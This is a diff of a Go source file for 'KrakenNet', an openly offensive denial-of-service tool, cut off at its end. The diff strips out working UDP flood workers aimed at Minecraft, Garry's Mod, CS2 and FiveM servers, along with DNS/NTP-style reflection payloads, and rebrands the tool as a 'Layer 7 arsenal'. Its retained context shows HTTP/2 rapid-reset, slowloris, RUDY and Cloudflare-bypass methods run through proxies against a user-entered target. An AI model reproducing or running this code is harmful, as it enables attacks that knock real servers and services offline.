@@ -6,7 +6,6 @@ import (
 	"context"
 	"crypto/tls"
 	"encoding/base64"
-	"encoding/binary"
 	"fmt"
 	"io"
 	"math/rand"
@@ -57,7 +56,6 @@ var (
 	target      string
 	connections int
 	workers     int
-	port        int
 	durationSec int
 
 	totalSuccess int64
@@ -135,13 +133,6 @@ var postPayloads = []string{
 	`{"action":"login","user":"admin","pass":"admin123"}`,
 	strings.Repeat("A", 1024),
 	strings.Repeat("B", 2048),
-}
-
-var discordPayloads = [][]byte{
-	[]byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"),
-	[]byte("\xff\xff\xff\xffgetstatus xxx\x00\x00\x00"),
-	[]byte("\xff\xff\xff\xffgetchallenge xxx\x00\x00\x00"),
-	[]byte("\xff\xff\xff\xffrcon \"\" \"\"\x00\x00\x00"),
 }
 
 var tlsFingerprints = []struct {
@@ -250,8 +241,8 @@ func printBanner() {
 `
 	fmt.Println(RedLight + banner + Reset)
 	fmt.Println()
-	fmt.Println("   " + BCyan + "K R A K E N   N E T" + Reset + "   " + BWhite + "v5.0 PHANTOM" + Reset)
-	fmt.Println("   " + Gray + "Full Spectrum Layer 7 | by Piwiii2.0" + Reset)
+	fmt.Println("   " + BCyan + "K R A K E N   N E T" + Reset + "   " + BWhite + "v6.0 LAYER7" + Reset)
+	fmt.Println("   " + Gray + "Elite Layer 7 Arsenal | by Piwiii2.0" + Reset)
 	fmt.Printf("   %sRuntime:%s Go %s | %sCPU:%s %d cores\n",
 		Gray, Reset, runtime.Version(), Gray, Reset, runtime.NumCPU())
 	fmt.Println()
@@ -310,20 +301,6 @@ func printMenu() {
 	mrow("http-smuggle", "HTTP request smuggling")
 	mrow("idle-h2", "H2 idle stream exhaust")
 	mfoot(Yellow)
-	fmt.Println()
-	mhead("UDP", Magenta)
-	mrow("udp-discord", "Quake3 query flood")
-	mrow("udp-bypass", "Random payload flood")
-	mrow("udp-gbps", "High bandwidth flood")
-	mrow("udp-amp", "Reflection-style flood")
-	mrow("fivem", "FiveM getinfo flood")
-	mfoot(Magenta)
-	fmt.Println()
-	mhead("GAME", Green)
-	mrow("minecraft", "Minecraft handshake flood")
-	mrow("gmod", "Garry's Mod query flood")
-	mrow("cs2", "CS2 A2S_INFO flood")
-	mfoot(Green)
 	fmt.Println()
 	mhead("ULTIMATE", RedLight)
 	mrow("hybrid", "TLS + API + WS + H2 reset")
@@ -409,14 +386,6 @@ func randomBypassHeader() (string, string) {
 func randomIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d",
 		rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(254)+1)
-}
-
-func randomIPv6() string {
-	groups := make([]string, 8)
-	for i := range groups {
-		groups[i] = fmt.Sprintf("%04x", rand.Intn(65536))
-	}
-	return strings.Join(groups, ":")
 }
 
 func randString(n int) string {
@@ -1319,293 +1288,6 @@ func malformedOnce(targetURL string) error {
 	return nil
 }
 
-func generatePayload(size int) []byte {
-	payload := make([]byte, size)
-	rand.Read(payload)
-	return payload
-}
-
-func writeVarInt(buf *bytes.Buffer, value int32) {
-	for {
-		temp := byte(value & 0x7F)
-		value >>= 7
-		if value != 0 {
-			temp |= 0x80
-		}
-		buf.WriteByte(temp)
-		if value == 0 {
-			break
-		}
-	}
-}
-
-func minecraftWorker(ctx context.Context, host string, mcPort int) {
-	addr := fmt.Sprintf("%s:%d", host, mcPort)
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-			if err != nil {
-				continue
-			}
-			for _, proto := range []int32{754, 759, 760, 762, 763, 765} {
-				buf := new(bytes.Buffer)
-				writeVarInt(buf, proto)
-				writeVarInt(buf, int32(len(host)))
-				buf.WriteString(host)
-				binary.Write(buf, binary.BigEndian, uint16(mcPort))
-				writeVarInt(buf, 1)
-				handshakePacket := new(bytes.Buffer)
-				writeVarInt(handshakePacket, int32(buf.Len()+1))
-				handshakePacket.WriteByte(0x00)
-				handshakePacket.Write(buf.Bytes())
-				conn.Write(handshakePacket.Bytes())
-			}
-			statusBuf := new(bytes.Buffer)
-			writeVarInt(statusBuf, 1)
-			statusBuf.WriteByte(0x00)
-			conn.Write(statusBuf.Bytes())
-			io.Copy(io.Discard, conn)
-			conn.Close()
-			atomic.AddInt64(&totalSuccess, 1)
-		}
-	}
-}
-
-type GMODWorker struct {
-	Target string
-	Port   int
-}
-
-func (gw *GMODWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
-	defer wg.Done()
-	addr := fmt.Sprintf("%s:%d", gw.Target, gw.Port)
-	conn, err := net.Dial("udp", addr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-	payloads := [][]byte{
-		[]byte("\xff\xff\xff\xff\x54Source Engine Query\x00"),
-		[]byte("\xff\xff\xff\xff\x56\x00\x00\x00\x00"),
-		[]byte("\xff\xff\xff\xff\x55\xff\xff\xff\xff"),
-	}
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			p := payloads[rand.Intn(len(payloads))]
-			if _, err := conn.Write(p); err == nil {
-				atomic.AddInt64(&totalSuccess, 1)
-				atomic.AddInt64(&totalBytes, int64(len(p)))
-			} else {
-				atomic.AddInt64(&totalFail, 1)
-			}
-		}
-	}
-}
-
-type CS2Worker struct {
-	Target string
-	Port   int
-}
-
-func (cw *CS2Worker) Start(ctx context.Context, wg *sync.WaitGroup) {
-	defer wg.Done()
-	addr := fmt.Sprintf("%s:%d", cw.Target, cw.Port)
-	conn, err := net.Dial("udp", addr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-	a2sInfo := []byte("\xff\xff\xff\xffTSource Engine Query\x00")
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			if _, err := conn.Write(a2sInfo); err == nil {
-				atomic.AddInt64(&totalSuccess, 1)
-				atomic.AddInt64(&totalBytes, int64(len(a2sInfo)))
-			} else {
-				atomic.AddInt64(&totalFail, 1)
-			}
-			time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
-		}
-	}
-}
-
-type FivemWorker struct {
-	Target string
-	Port   int
-	Burst  int
-}
-
-func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
-	defer wg.Done()
-	addr := fmt.Sprintf("%s:%d", fw.Target, fw.Port)
-	conn, err := net.Dial("udp", addr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-	payloads := [][]byte{
-		[]byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"),
-		[]byte("\xff\xff\xff\xffgetchallenge\x00\x00\x00"),
-		[]byte("\xff\xff\xff\xffgetstatus\x00\x00\x00"),
-	}
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			p := payloads[rand.Intn(len(payloads))]
-			for i := 0; i < fw.Burst; i++ {
-				if _, err := conn.Write(p); err == nil {
-					atomic.AddInt64(&totalSuccess, 1)
-					atomic.AddInt64(&totalBytes, int64(len(p)))
-				} else {
-					atomic.AddInt64(&totalFail, 1)
-				}
-			}
-		}
-	}
-}
-
-type UDPDiscordWorker struct {
-	Target string
-	Port   int
-}
-
-func (uw *UDPDiscordWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
-	defer wg.Done()
-	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
-	conn, err := net.Dial("udp", addr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			payload := discordPayloads[rand.Intn(len(discordPayloads))]
-			if _, err := conn.Write(payload); err == nil {
-				atomic.AddInt64(&totalSuccess, 1)
-				atomic.AddInt64(&totalBytes, int64(len(payload)))
-			} else {
-				atomic.AddInt64(&totalFail, 1)
-			}
-		}
-	}
-}
-
-type UDPBypassWorker struct {
-	Target string
-	Port   int
-}
-
-func (uw *UDPBypassWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
-	defer wg.Done()
-	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
-	conn, err := net.Dial("udp", addr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			size := rand.Intn(1200) + 50
-			payload := generatePayload(size)
-			switch rand.Intn(4) {
-			case 0:
-				payload[0] = 0xFF; payload[1] = 0xFF; payload[2] = 0xFF; payload[3] = 0xFF
-			case 1:
-				copy(payload, []byte("\x00\x00\x00\x00"))
-			case 2:
-				copy(payload, []byte("TE\x00\x00"))
-			}
-			if _, err := conn.Write(payload); err == nil {
-				atomic.AddInt64(&totalSuccess, 1)
-				atomic.AddInt64(&totalBytes, int64(size))
-			} else {
-				atomic.AddInt64(&totalFail, 1)
-			}
-		}
-	}
-}
-
-type UDPGbpsWorker struct {
-	Target string
-	Port   int
-	Size   int
-}
-
-func (uw *UDPGbpsWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
-	defer wg.Done()
-	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
-	conn, err := net.Dial("udp", addr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-	payload := generatePayload(uw.Size)
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			if _, err := conn.Write(payload); err == nil {
-				atomic.AddInt64(&totalSuccess, 1)
-				atomic.AddInt64(&totalBytes, int64(uw.Size))
-			} else {
-				atomic.AddInt64(&totalFail, 1)
-			}
-		}
-	}
-}
-
-type UDPAmpWorker struct {
-	Target string
-	Port   int
-}
-
-func (uw *UDPAmpWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
-	defer wg.Done()
-	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
-	conn, err := net.Dial("udp", addr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-	payloads := [][]byte{
-		[]byte("\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x01"),
-		[]byte("\x00\x2b\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04pool\x03ntp\x03org\x00\x00\x01\x00\x01"),
-		[]byte("\x26\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
-	}
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			p := payloads[rand.Intn(len(payloads))]
-			if _, err := conn.Write(p); err == nil {
-				atomic.AddInt64(&totalSuccess, 1)
-				atomic.AddInt64(&totalBytes, int64(len(p)))
-			} else {
-				atomic.AddInt64(&totalFail, 1)
-			}
-		}
-	}
-}
-
 type WsFloodWorker struct {
 	Target string
 }
@@ -1817,7 +1499,7 @@ func statsReporter(ctx context.Context) {
 				successRate = float64(ok) / float64(ok+fail) * 100
 			}
 
-			var goroutines int = runtime.NumGoroutine()
+			goroutines := runtime.NumGoroutine()
 
 			line := fmt.Sprintf(
 				"\r%s│%s RPS:%s%-8.0f%s [%s] %sPeak:%-8.0f%s │%s OK:%-8d%s │%s FAIL:%-6d%s │%s %.1f%%%s │%s BW:%s/s%s │%s T-%ss%s │%s G:%d%s     ",
@@ -1872,7 +1554,7 @@ func printFinalStats(mode string) {
 
 	fmt.Println()
 	fmt.Println(Magenta + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
-	fmt.Println(Magenta + "║" + Reset + "  " + Magenta + "FINAL STATISTICS — PHANTOM v5.0" + Reset + strings.Repeat(" ", 23) + Magenta + "║" + Reset)
+	fmt.Println(Magenta + "║" + Reset + "  " + Magenta + "FINAL STATISTICS — LAYER7 v6.0" + Reset + strings.Repeat(" ", 23) + Magenta + "║" + Reset)
 	fmt.Println(Magenta + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
 	fparam("Method", mode)
 	fparam("Duration", fmt.Sprintf("%.0f seconds", elapsed))
@@ -1886,7 +1568,7 @@ func printFinalStats(mode string) {
 	fparam("Bandwidth", formatBytes(float64(data)/elapsed)+"/s")
 	fmt.Println(Magenta + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
 	fmt.Println()
-	fmt.Println(BGreen + "[+] Attack completed — KrakenNet PHANTOM v5.0" + Reset)
+	fmt.Println(BGreen + "[+] Attack completed — KrakenNet LAYER7 v6.0" + Reset)
 }
 
 var phantomMethods = []string{
@@ -2108,77 +1790,6 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 			}()
 		}
 
-	case "udp-discord":
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			w := &UDPDiscordWorker{Target: hostName, Port: port}
-			go w.Start(ctx, wg)
-		}
-
-	case "udp-bypass":
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			w := &UDPBypassWorker{Target: hostName, Port: port}
-			go w.Start(ctx, wg)
-		}
-
-	case "udp-amp":
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			w := &UDPAmpWorker{Target: hostName, Port: port}
-			go w.Start(ctx, wg)
-		}
-
-	case "udp-gbps":
-		var pktSize int
-		fmt.Print(Yellow + "Packet size (bytes, 50-1400): " + Reset)
-		fmt.Scanf("%d\n", &pktSize)
-		if pktSize < 50 || pktSize > 1400 {
-			pktSize = 1400
-		}
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			w := &UDPGbpsWorker{Target: hostName, Port: port, Size: pktSize}
-			go w.Start(ctx, wg)
-		}
-
-	case "fivem":
-		var uploadMbps float64
-		fmt.Print(Yellow + "Upload in Mbps (e.g., 0.84): " + Reset)
-		fmt.Scanf("%f\n", &uploadMbps)
-		if uploadMbps <= 0 {
-			uploadMbps = 1.0
-		}
-		burst := int(uploadMbps * 1_000_000 / 120)
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			w := &FivemWorker{Target: hostName, Port: port, Burst: burst}
-			go w.Start(ctx, wg)
-		}
-
-	case "minecraft":
-		for i := 0; i < connections; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				minecraftWorker(ctx, hostName, port)
-			}()
-		}
-
-	case "gmod":
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			w := &GMODWorker{Target: hostName, Port: port}
-			go w.Start(ctx, wg)
-		}
-
-	case "cs2":
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			w := &CS2Worker{Target: hostName, Port: port}
-			go w.Start(ctx, wg)
-		}
-
 	case "hybrid":
 		quarter := workers / 4
 		if quarter < 1 {
@@ -2211,306 +1822,4 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 			}
 		})
 		spawnN(quarter, func() {
-			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					for j := 0; j < connections; j++ {
-						if apiFloodRequest(client, target) {
-							atomic.AddInt64(&totalSuccess, 1)
-						} else {
-							atomic.AddInt64(&totalFail, 1)
-						}
-					}
-				}
-			}
-		})
-		for i := 0; i < quarter; i++ {
-			wg.Add(1)
-			w := &WsFloodWorker{Target: target}
-			go w.Start(ctx, wg)
-		}
-		spawnN(quarter, func() {
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					if err := rapidResetOnce(target); err != nil {
-						atomic.AddInt64(&totalFail, 1)
-					}
-				}
-			}
-		})
-
-	case "apocalypse":
-		sixth := workers / 6
-		if sixth < 1 {
-			sixth = 1
-		}
-		funcs := []func(){
-			func() {
-				client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						for j := 0; j < connections; j++ {
-							if cfBypassRequest(client, target) {
-								atomic.AddInt64(&totalSuccess, 1)
-							} else {
-								atomic.AddInt64(&totalFail, 1)
-							}
-						}
-					}
-				}
-			},
-			func() {
-				client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						for j := 0; j < connections; j++ {
-							if apiFloodRequest(client, target) {
-								atomic.AddInt64(&totalSuccess, 1)
-							} else {
-								atomic.AddInt64(&totalFail, 1)
-							}
-						}
-					}
-				}
-			},
-			func() {
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						if err := rapidResetOnce(target); err != nil {
-							atomic.AddInt64(&totalFail, 1)
-						}
-					}
-				}
-			},
-			func() {
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						if slowlorisOnce(target, ctx.Done()) {
-							atomic.AddInt64(&totalReq, 1)
-						} else {
-							atomic.AddInt64(&totalFail, 1)
-						}
-					}
-				}
-			},
-			func() {
-				client := newNoTimeoutClient()
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						if rudyRequest(client, target, ctx.Done()) {
-							atomic.AddInt64(&totalSuccess, 1)
-						} else {
-							atomic.AddInt64(&totalFail, 1)
-						}
-					}
-				}
-			},
-			func() {
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						if err := h2ContOnce(target); err != nil {
-							atomic.AddInt64(&totalFail, 1)
-						}
-					}
-				}
-			},
-		}
-		for _, fn := range funcs {
-			f := fn
-			for i := 0; i < sixth; i++ {
-				wg.Add(1)
-				go func() {
-					defer wg.Done()
-					f()
-				}()
-			}
-		}
-
-	case "phantom":
-		perMethod := workers / len(phantomMethods)
-		if perMethod < 1 {
-			perMethod = 1
-		}
-		for _, m := range phantomMethods {
-			method := m
-			for i := 0; i < perMethod; i++ {
-				wg.Add(1)
-				go func() {
-					defer wg.Done()
-					client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
-					for {
-						select {
-						case <-ctx.Done():
-							return
-						default:
-							switch method {
-							case "kraken":
-								sendTLSRequest(client, target)
-							case "api-flood":
-								apiFloodRequest(client, target)
-							case "cf-bypass":
-								cfBypassRequest(client, target)
-							case "header-flood":
-								headerFloodRequest(client, target)
-							case "mixpost":
-								mixPostRequest(client, target)
-							case "cache-bust":
-								cacheBustRequest(client, target)
-							case "phantom-get":
-								phantomGetRequest(client, target)
-							case "cookie-bomb":
-								cookieBombRequest(client, target)
-							case "malformed":
-								malformedOnce(target)
-							case "rapid-reset":
-								rapidResetOnce(target)
-							case "h2-cont":
-								h2ContOnce(target)
-							}
-							atomic.AddInt64(&totalReq, 1)
-						}
-					}
-				}()
-			}
-		}
-
-	default:
-		fmt.Println(BRed + "[-] Unknown method: " + mode + Reset)
-	}
-}
-
-func runAttack() {
-	reader := bufio.NewReader(os.Stdin)
-	userAgents = loadListFromFile("useragent.txt")
-	referers = loadListFromFile("referers.txt")
-	proxies = loadListFromFile("http.txt")
-	if len(userAgents) == 0 {
-		userAgents = defaultUserAgents
-	}
-	if len(referers) == 0 {
-		referers = defaultReferers
-	}
-
-	peakRPS = 0
-	rpsIdx = 0
-	for i := range rpsHistory {
-		rpsHistory[i] = 0
-	}
-
-	fmt.Print(Yellow + "Target (URL or IP): " + Reset)
-	rawTarget, _ := reader.ReadString('\n')
-	target = strings.TrimSpace(rawTarget)
-	if target == "" {
-		return
-	}
-	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
-		target = "https://" + target
-	}
-	_, hostName, _, _ := parseTarget(target)
-
-	printMenu()
-
-	fmt.Print(Yellow + "Select method: " + Reset)
-	mode, _ := reader.ReadString('\n')
-	mode = strings.TrimSpace(strings.ToLower(mode))
-
-	fmt.Print(Yellow + "Connections per worker: " + Reset)
-	fmt.Scanf("%d\n", &connections)
-	fmt.Print(Yellow + "Number of workers: " + Reset)
-	fmt.Scanf("%d\n", &workers)
-	fmt.Print(Yellow + "Port (UDP/Game, 0=443): " + Reset)
-	fmt.Scanf("%d\n", &port)
-	fmt.Print(Yellow + "Duration (seconds): " + Reset)
-	fmt.Scanf("%d\n", &durationSec)
-
-	if connections < 1 {
-		connections = 10
-	}
-	if workers < 1 {
-		workers = 10
-	}
-	if port < 1 {
-		port = 443
-	}
-	if durationSec < 1 {
-		durationSec = 30
-	}
-
-	atomic.StoreInt64(&totalSuccess, 0)
-	atomic.StoreInt64(&totalFail, 0)
-	atomic.StoreInt64(&totalBytes, 0)
-	atomic.StoreInt64(&totalReq, 0)
-	lastReq = 0
-
-	fmt.Println()
-	fmt.Println(Cyan + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
-	fmt.Println(Cyan + "║" + Reset + "  " + BCyan + "MISSION PARAMETERS" + Reset + strings.Repeat(" ", 36) + Cyan + "║" + Reset)
-	fmt.Println(Cyan + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
-	mparam("Target", target, BWhite)
-	mparam("Method", mode, BYellow)
-	mparam("Workers", strconv.Itoa(workers), BWhite)
-	mparam("Connections", strconv.Itoa(connections), BWhite)
-	mparam("Port", strconv.Itoa(port), BWhite)
-	mparam("Duration", strconv.Itoa(durationSec)+" seconds", BWhite)
-	mparam("Proxies", strconv.Itoa(len(proxies))+" loaded", BWhite)
-	mparam("UserAgents", strconv.Itoa(len(userAgents))+" loaded", BWhite)
-	mparam("Goroutines", fmt.Sprintf("%d cores available", runtime.NumCPU()), BWhite)
-	fmt.Println(Cyan + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
-	fmt.Println()
-	fmt.Println(BGreen + "[+] Deploying PHANTOM workers..." + Reset)
-
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)
-	defer cancel()
-	var wg sync.WaitGroup
-
-	attackStart = time.Now()
-	go statsReporter(ctx)
-
-	launchWorkers(ctx, &wg, mode, hostName)
-	wg.Wait()
-	printFinalStats(mode)
-}
-
-func main() {
-	rand.Seed(time.Now().UnixNano())
-	runtime.GOMAXPROCS(runtime.NumCPU())
-	fmt.Print("\033[2J\033[H")
-	printBanner()
-	reader := bufio.NewReader(os.Stdin)
-	for {
-		runAttack()
-		fmt.Print(Yellow + "\nStart another attack? (y/n): " + Reset)
-		again, _ := reader.ReadString('\n')
-		again = strings.TrimSpace(strings.ToLower(again))
-		if again != "y" {
-			fmt.Println(BGreen + "[+] KrakenNet PHANTOM offline. Ghost exits." + Reset)
-			break
-		}
-		fmt.Print("\033[2J\033[H")
-		printBanner()
-	}
-}
+			client := newHTTP
